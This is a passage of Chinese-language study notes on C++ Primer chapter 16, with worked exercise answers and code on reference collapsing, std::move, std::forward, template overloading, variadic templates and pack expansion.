&amp;&amp;</code>折叠成<code>X&amp;&amp;</code>。</li></ul></li><li>上面两个例外规则导致两个重要结果：<ul><li>1.如果一个函数参数是一个指向模板类型参数的右值引用（如<code>T&amp;&amp;</code>），则它可以被绑定到一个左值上；</li><li>2.<strong>如果实参是一个左值，则推断出的模板实参类型将是一个左值引用，且函数参数将被实例化为一个左值引用参数（<code>T&amp;</code>）。</strong></li></ul></li></ul></li><li>右值引用在涉及引用类型时，编写正确的代码会变得异常困难。<br>右值引用通常用于两种情况：模板转发 和 模板被重载。模板被重载的例子如下（这种写法在P481可见）：<ul><li><code>template &lt;typename T&gt; void f(T&amp;&amp;);</code> 绑定到非 const 右值</li><li><code>template &lt;typename T&gt; void f(const T&amp;);</code>== 左值和 const 右值==</li></ul></li></ul><h4 id="练习16-42">练习16.42</h4><blockquote><p>个人感觉这道题很重要，理解清楚这个问题是后面理解为啥 <code>std:move</code> 要 <code>remove_reference</code> 的基础。</p></blockquote><p>Q：对下面每个调用，确定 <code>T</code> 和 <code>val</code> 的类型：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(T&amp;&amp; val)</span></span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> ci = i;</span><br><span class="line">(a) <span class="built_in">g</span>(i);</span><br><span class="line">(b) <span class="built_in">g</span>(ci);</span><br><span class="line">(c) <span class="built_in">g</span>(i * ci);</span><br></pre></td></tr></table></figure><p>A：</p><ol><li><code>T</code> 为 <code>int &amp;</code>，<code>val</code> 的类型为 <code>int &amp;</code>。<br>根据<strong>右值引用的特殊类型推断规则</strong>：当实参是一个左值时，编译器推断 <code>T</code> 为实参的左值引用类型，而非左值类型。而 <code>int&amp; &amp;&amp;</code> 在引用折叠规则的作用下，被折叠为<code>int &amp;</code>。</li><li><code>T</code> 为 <code>const int &amp;</code>，<code>val</code> 的类型为 <code>const int &amp;</code>。<br>原因同上。</li><li><code>T</code> 为 <code>int</code>，<code>val</code> 的类型为 <code>int &amp;&amp;</code>。<br>实参是一个右值，编译器推断 <code>T</code> 为该右值的类型，因此 <code>val</code> 的类型就是右值类型的右值引用，被折叠为<code>int &amp;&amp;</code>。</li></ol><blockquote><p>如何验证答案？</p><ul><li>可以在 <code>g</code> 中声明类型为 <code>T</code> 的局部变量<code>v</code>, 将<code>val</code> 赋值给它。然后打印 <code>v</code> 和 <code>val</code> 的地址，即可判断 <code>T</code> 为<code>int &amp;</code> 还是 <code>int</code>。</li><li>还可通过对 <code>v</code> 赋值来判断 <code>T</code> 是否为 <code>const</code>的。</li></ul></blockquote><h4 id="练习16-43">练习16.43</h4><p>Q：使用上一题定义的函数，如果我们调用<code>g(i = ci)</code>,<code>g</code> 的模版参数将是什么？</p><p>A：<code>i = ci</code> 返回的是左值，因此 <code>g</code> 的模版参数是 <code>int&amp;</code>。</p><h4 id="练习16-44">练习16.44</h4><p>Q：使用与第一题中相同的三个调用，如果 <code>g</code> 的函数参数声明为 <code>T</code>（而不是<code>T&amp;&amp;</code>），确定<code>T</code>的类型。如果<code>g</code>的函数参数是 <code>const T&amp;</code>呢？</p><p>A：</p><ul><li><p>当声明为<code>T</code>的时候，<code>T</code>的类型都为<code>int</code>，<code>val</code>的类型也都为<code>int</code>。</p></li><li><p>当声明为<code>const T&amp;</code>的时候，T的类型都为<code>int</code>,  <code>val</code>的类型都为<code>const int &amp;</code> 。</p></li></ul><h4 id="练习16-45">练习16.45</h4><p>Q：如果下面的模版，如果我们对一个像42这样的字面常量调用<code>g</code>，解释会发生什么？如果我们对一个<code>int</code> 类型的变量调用<code>g</code> 呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(T&amp;&amp; val)</span> </span>&#123; vector&lt;T&gt; v; &#125;</span><br></pre></td></tr></table></figure><p>A：</p><ul><li>对<code>g(42)</code>，<code>T</code> 被推断为<code>int</code>，<code>val</code> 的类型为 <code>int &amp;&amp;</code>，因此 <code>v</code> 是 <code>int</code> 的 vector。</li><li>对<code>g(i)</code>，<code>T</code> 被推断为 <code>int&amp;</code>，<code>val</code> 的类型折叠为 <code>int &amp;</code>，因此<code>v</code> 被声明为 <code>int &amp;</code> 的vector。<br>但注意<strong>vector在动态内存空间中保存元素，需要维护指向其元素的指针，但引用不是对象，没有实际地址</strong>，因此不能定义指向引用的指针，也就是说<code>vector&lt;T&amp;&gt;</code>会导致编译失败。</li></ul><h3 id="理解std-move">理解std::move</h3><ul><li>标准库 <code>move</code> 函数是使用右值引用的模板的一个很好的例子。</li><li>从一个左值 <code>static_cast</code> 到一个右值引用是允许的。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">typename</span> remove_reference&lt;T&gt;::<span class="function">type&amp;&amp; <span class="title">move</span><span class="params">(T&amp;&amp; t)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;<span class="keyword">typename</span> remove_reference&lt;T&gt;::type&amp;&amp;&gt;(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须要这么写，否则传左值引用时，T被推断为<code>type&amp;</code>，根据引用折叠规则，返回的也是左值。</p><h3 id="转发">转发</h3><ul><li><p>通过将一个函数参数定义为一个指向函数模板类型参数的右值引用，可以保持其对于实参的所有类型信息。<br>使用引用类型（左值 / 右值）使得我们可以保持 const 属性，因为在引用类型中 const 的底层的。</p></li><li><p>使用一个名为<code>forward</code>的新标准库设施来传递参数，它<strong>能够保持原始实参的类型</strong>。</p></li><li><p>注意：forward 不要用自动推导，要显式指定。</p><blockquote><p>forward需要把左值引用类型的左值转发为左值，右值引用类型的左值转发为右值，自动推导会一对一错。</p></blockquote></li><li><p>定义在头文件<code>utility</code>中。</p></li><li><p><strong>必须通过显式模板实参来调用。</strong></p></li><li><p><strong><code>forward</code>返回显式实参类型的右值引用。即，<code>forward&lt;T&gt;</code>的返回类型是<code>T&amp;&amp;</code>。</strong></p></li></ul><h2 id="重载与模板">重载与模板</h2><ul><li>多个可行模板：当有多个重载模板对一个调用提供同样好的匹配时，<strong>会选择最特例化的版本。</strong><br>比如 <code>debug_rep(const T&amp;)</code>本质上可以用于任何类型，包括指针类型，其比 <code>debug_rep(T*)</code> 更通用，后者只能用于指针类型。</li><li>非模板和模板重载：对于一个调用，如果一个非函数模板与一个函数模板提供同样好的匹配，则<strong>选择非模板版本</strong>。</li></ul><h4 id="练习16-49">练习16.49</h4><p>Q：解释下面每个调用会发生什么：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(T)</span></span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">const</span> T*)</span></span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(T)</span></span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(T*)</span></span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">42</span>, *p = &amp;i;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> ci = <span class="number">0</span>, *p2 = &amp;ci;</span><br><span class="line"><span class="built_in">g</span>(<span class="number">42</span>); <span class="built_in">g</span>(p); <span class="built_in">g</span>(ci); <span class="built_in">g</span>(p2);</span><br><span class="line"><span class="built_in">f</span>(<span class="number">42</span>); <span class="built_in">f</span>(p); <span class="built_in">f</span>(ci); <span class="built_in">f</span>(p2);</span><br></pre></td></tr></table></figure><p>A：注意 <code>f(p)</code> 和 <code>f(int*)</code>（其中<code>T</code>被实例化为<code>int*</code>）的匹配程度比和 <code>f(const int*)</code>（其中<code>T</code>被实例化为<code>int</code>）高，而 <code>f(p2)</code> 相反。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">g</span>(<span class="number">42</span>);    <span class="comment">//g(T), T被推断为int</span></span><br><span class="line"><span class="built_in">g</span>(p);     <span class="comment">//g(T*), T被推断为int</span></span><br><span class="line"><span class="built_in">g</span>(ci);      <span class="comment">//g(T),  T被推断为int</span></span><br><span class="line"><span class="built_in">g</span>(p2);      <span class="comment">//g(T*), T被推断位const int</span></span><br><span class="line"><span class="built_in">f</span>(<span class="number">42</span>);    <span class="comment">//f(T), T被推断为int</span></span><br><span class="line"><span class="built_in">f</span>(p);     <span class="comment">//f(T), T被推断为int*</span></span><br><span class="line"><span class="built_in">f</span>(ci);    <span class="comment">//f(T), T被推断为int</span></span><br><span class="line"><span class="built_in">f</span>(p2);      <span class="comment">//f(const T*), T被推断为int</span></span><br></pre></td></tr></table></figure><p>注意：形参中顶层const会被忽略（如3），而底层const不会（如果形参类型为T&amp;, 则会保留 const 属性，因为引用类型中的 const 是底层的）。</p><h2 id="可变参数模板">可变参数模板</h2><p><strong>可变参数模板</strong>就是一个接受可变数目参数的模板函数或模板类。</p><ul><li>可变数目的参数被称为<strong>参数包</strong>。<ul><li><strong>模板参数包</strong>：标识l<strong>零个</strong>或多个模板参数。</li><li><strong>函数参数包</strong>：标识<strong>零个</strong>或多个函数参数。</li></ul></li><li>用一个省略号来指出一个模板参数或函数参数，表示一个包。</li><li><code>template &lt;typename T, typename... Args&gt;</code>，<code>Args</code>第一个模板参数包。</li><li><code>void foo(const T &amp;t, const Args&amp; ... rest);</code>，<code>rest</code>是一个函数参数包。<br>如果一个参数的类型是一个模板参数包，则此参数也是一个函数参数包。</li><li><code>sizeof...</code>运算符，返回参数的数目。<br>类似 <code>sizeof</code>， <code>sizeof...</code> 也返回一个常量表达式，而且不会对实参求值。</li></ul><h4 id="练习16-51">练习16.51</h4><p>Q：调用本节中的每个 <code>foo</code>，确定 <code>sizeof...(Args)</code> 和 <code>sizeof...(rest)</code>分别返回什么。</p><p>A：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> ... Args&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(<span class="type">const</span> T &amp;t, <span class="type">const</span> Args&amp; ... rest)</span></span>&#123;</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;sizeof...(Args): &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>...(Args) &lt;&lt; <span class="string">&quot;\tsizeof...(rest): &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>...(rest) &lt;&lt; endl;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test_param_packet</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="type">double</span> d = <span class="number">3.14</span>;</span><br><span class="line">  string s = <span class="string">&quot;how now brown cow&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">foo</span>(i, s, <span class="number">42</span>, d);</span><br><span class="line">  <span class="built_in">foo</span>(s, <span class="number">42</span>, <span class="string">&quot;hi&quot;</span>);</span><br><span class="line">  <span class="built_in">foo</span>(d, s);</span><br><span class="line">  <span class="built_in">foo</span>(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">  <span class="built_in">foo</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">test_param_packet</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sizeof</span>...(Args): <span class="number">3</span><span class="keyword">sizeof</span>...(rest): <span class="number">3</span></span><br><span class="line"><span class="keyword">sizeof</span>...(Args): <span class="number">2</span><span class="keyword">sizeof</span>...(rest): <span class="number">2</span></span><br><span class="line"><span class="keyword">sizeof</span>...(Args): <span class="number">1</span><span class="keyword">sizeof</span>...(rest): <span class="number">1</span></span><br><span class="line"><span class="keyword">sizeof</span>...(Args): <span class="number">0</span><span class="keyword">sizeof</span>...(rest): <span class="number">0</span></span><br><span class="line"><span class="keyword">sizeof</span>...(Args): <span class="number">5</span><span class="keyword">sizeof</span>...(rest): <span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="编写可变参数函数模板">编写可变参数函数模板</h3><ul><li><strong>可变参数函数通常是递归的：第一步调用处理包中的第一个实参，然后用剩余实参调用自身。</strong></li><li><strong>为了终止递归，还需要定义一个非可变参数的 <code>print</code> 函数。</strong><br>因为 可变模板 / 函数参数都可以表示零个参数。</li></ul><h4 id="练习16-53">练习16.53</h4><p>Q：编写你自己版本的 <code>print</code> 函数，并打印一个、两个及五个实参来测试它，要打印的每个实参都应有不同的类型。</p><p>A：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Printable&gt;</span></span><br><span class="line"><span class="function">std::ostream&amp; <span class="title">print</span><span class="params">(std::ostream&amp; os, Printable <span class="type">const</span>&amp; printable)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> os &lt;&lt; printable;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// recursion</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Printable, <span class="keyword">typename</span>... Args&gt;</span></span><br><span class="line"><span class="function">std::ostream&amp; <span class="title">print</span><span class="params">(std::ostream&amp; os, Printable <span class="type">const</span>&amp; printable, Args <span class="type">const</span>&amp;... rest)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(os &lt;&lt; printable &lt;&lt; <span class="string">&quot;, &quot;</span>, rest...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包扩展">包扩展</h3><ul><li>对于一个参数包，除了获取它的大小，唯一能做的事情就是 <strong>扩展（expand）</strong>。<br>扩展一个包就是把它分解为构成的元素，对每个元素应用模式，获得扩展后的列表。通过再模式右边放一个省略号(…)来触发扩展操作。</li><li>扩展一个包时，还要提供用于每个扩展元素的 <strong>模式（pattern）</strong>。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function">ostream &amp;</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(ostream &amp;os, <span class="type">const</span> T &amp;t, <span class="type">const</span> Args&amp;... rest)</span>  <span class="comment">// 扩展Args</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    os &lt;&lt; t &lt;&lt; <span class="string">&quot;, &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(os, rest...);  <span class="comment">// 扩展rest</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个扩展操作扩展模板参数包，将模式 <code>const Args&amp;</code> 应用到模板参数包 <code>Args</code> 中的每个元素。此模式的扩展结果是一个逗号分隔的零个或多个类型的列表。</p><p><strong>理解包扩展</strong></p><ul><li><code>print(os, debug_rep(res)...)</code> 相当于 <code>print(os, debug_rep(fcnNmae), debug_rep(code.num()), debug_rep(otherData), debug_rep(&quot;otherData&quot;))</code></li><li><code>print(os, debug_rep(res...))</code> 相当于 <code>print(os, debug_rep(fcnName, code.num(), otherData, &quot;otherData&quot;))</code>, 是错误的。</li></ul><blockquote><p>扩展中的模式会独立地应用于包中的每个元素。</p></blockquote><h3 id="转发参数包">转发参数包</h3><ul><li><p>新标准下可以组合使用可变参数模板和 <code>forward</code> 机制，实现将实参不变地传递给其他函数。</p></li><li><p>保持类型信息是一个两阶段的过程，</p><ul><li><p>首先，为了保持实参中的类型信息，必须将 <code>emplace_back</code> 的函数参数定义为模板类型参数的<strong>右值引用</strong>。</p><blockquote><p><strong>右值引用能接受任意类型参数，回忆右值引用参数规则和引用折叠规则。</strong></p></blockquote></li><li><p>其次，当 emplace_back 将这些实参传递给 <code>construct</code> 时，必须使用 <code>forward</code> 来保持实参的原始类型信息。</p></li></ul></li><li><p><code>alloc.construct(first_free++, std::forward&lt;Args&gt;(args)...)</code> 其中<code>std::forward&lt;Args&gt;(args)...</code> 既扩展模板参数包 <code>Args</code> , 也扩展函数参数包<code>args</code>， 此模式生成的元素形式：<code>std::forward&lt;Ti&gt;(ti)</code>。<br>如 <code>svec.emplace_back(10, 'c')</code> 会扩展出 <code>std::forward&lt;int&gt;(10), std::forward&lt;char&gt;(c)</code>。</p></li></ul><blockquote><p><strong>建议：转发和可变参数模板</strong></p><p>可变参数函数通常将它们的参数转发给其他函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(Args&amp;&amp;... args)</span> </span>&#123;  <span class="comment">// 将Args扩展为一个右值引用的列表</span></span><br><span class="line">    <span class="comment">// work的实参既扩展了Args又扩展了args</span></span><br><span class="line">    <span class="built_in">work</span>(std::forward&lt;Args&gt;(args)...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 fun 的参数是<strong>右值引用，因此我们可以传递给它任意类型的实参</strong>。</p><p>思考：不能将一个右值引用直接绑定到一个变量上，那为啥可以对右值引用参数传递任意类型的实参呢？</p><p>回忆右值引用参数规则：形参是 T &amp;&amp;（T 是模板形参）或者 auto &amp;&amp; 时，实参是右值时 T 不是引用（T &amp;&amp; 是右值引用），实参是左值时 T 是左值引用。</p><p>注意：变量是左值喔！</p></blockquote><h3 id="重要扩展：完美转发">重要扩展：完美转发</h3><h4 id="C-完美转发为什么必须要有std-forward？">C++完美转发为什么必须要有std::forward？</h4><p>参考：<a href="https://www.cnblogs.com/lfri/p/16588306.html">C++完美转发为什么必须要有std::forward？ - Rogn - 博客园 (cnblogs.com)</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">G</span><span class="params">(T &amp;&amp;t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">F</span>(t); <span class="comment">// 1  direct call</span></span><br><span class="line">    <span class="comment">// return F(std::forward&lt;T&gt;(t)); // 2  forward call</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>universal reference 转发时并不完美，只完美了一半，当转发目标的的参数是右值引用时，会出现问题：<strong>右值引用指向右值，但本身是左值</strong>。<br>如果不采用发转，不管传进来的是右值，经过右值引用也会变成左值，从而去调用左值函数。</p><p>用forward(t)当实参，T推断成int&amp;&amp;，所以返回值是int&amp;&amp; &amp;&amp;,折叠成int&amp;&amp;，可以被绑定到F参数的右值引用上，就没有错误了。</p><h4 id="std-forward的原理">std::forward的原理</h4><p>引入右值引用就是为了避免不必要的拷贝和支持完美转发，这里很有必要介绍下完美转发。</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/161039484">完美转发 = 引用折叠 + 万能引用 + std::forward</a></p><p><code>forward</code> 实现原理：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T&amp;&amp; <span class="title">forward</span><span class="params">(<span class="keyword">typename</span> std::remove_reference&lt;T&gt;::type&amp; param)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">static_cast</span>&lt;T&amp;&amp;&gt;(param);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T&amp;&amp; <span class="title">forward</span><span class="params">(<span class="keyword">typename</span> std::remove_reference&lt;T&gt;::type&amp;&amp; param)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">static_cast</span>&lt;T&amp;&amp;&gt;(param);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧接着std::forward模板函数对传入的参数进行强制类型转换，转换的目标类型符合引用折叠规则，因此<strong>左值参数最终转换后仍为左值，右值参数最终转成右值</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T &amp; t)</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;左值&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T &amp;&amp; t)</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;右值&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testForward</span><span class="params">(T &amp;&amp; v)</span></span>&#123;</span><br><span class="line">    <span class="built_in">print</span>(v);</span><br><span class="line">    <span class="built_in">print</span>(std::forward&lt;T&gt;(v));</span><br><span class="line">    <span class="built_in">print</span>(std::<span class="built_in">move</span>(v));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">testForward</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;======================&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">testFoward</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//clang++ -std=c++11 -g -o forward test_forward.cpp</span></span><br><span class="line"><span class="comment">// 左值</span></span><br><span class="line"><span class="comment">// 右值</span></span><br><span class="line"><span class="comment">// 右值</span></span><br><span class="line"><span class="comment">// =========================</span></span><br><span class="line"><span class="comment">// 左值</span></span><br><span class="line"><span class="comment">// 左值</span></span><br><span class="line"><span class="comment">// 右值</span></span><br></pre></td></tr></table></figure><h4 id="练习16-58">练习16.58</h4><p>Q：为你的 <code>StrVec</code> 类及你为16.1.2节练习中编写的 <code>Vec</code> 类添加 <code>emplace_back</code> 函数。</p><p>A：<code>StrVec</code>类：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span>... Args&gt;</span><br><span class="line"><span class="function"><span class="keyword">inline</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrVec::emplace_back</span><span class="params">(Args&amp;&amp;... args)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">chk_n_alloc</span>();</span><br><span class="line">    alloc.<span class="built_in">construct</span>(first_free++, std::forward&lt;Args&gt;(args)...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Vec</code> 类：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;        <span class="comment">//for the class  template</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span>... Args&gt;  <span class="comment">//for the member template</span></span><br><span class="line"><span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">Vec&lt;T&gt;::<span class="built_in">emplace_back</span>(Args&amp;&amp;...args) &#123;</span><br><span class="line">    <span class="built_in">chk_n_alloc</span>();</span><br><span class="line">    alloc.<span class="built_in">construct</span>(first_free++, std::forward&lt;Args&gt;(args)...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>P596：当在类模板外定义一个成员模板时，必须同时为类模板和成员模板提供模板参数列表。<br>类模板的参数列表在前，后跟成员自己的模板参数列表。</p></blockquote><h4 id="练习16-60-16-61">练习16.60 &amp; 16.61</h4><p>Q：解释 <code>make_shared</code> 是如何工作的。并定义自己版本的<code>make_shared</code>。</p><p>A：工作原理：接受参数包，经过扩展，转发给<code>new</code>作为<code>vector</code>的初始化参数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function">SP&lt;T&gt; <span class="title">make_shared</span><span class="params">(Args&amp;&amp;... args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span 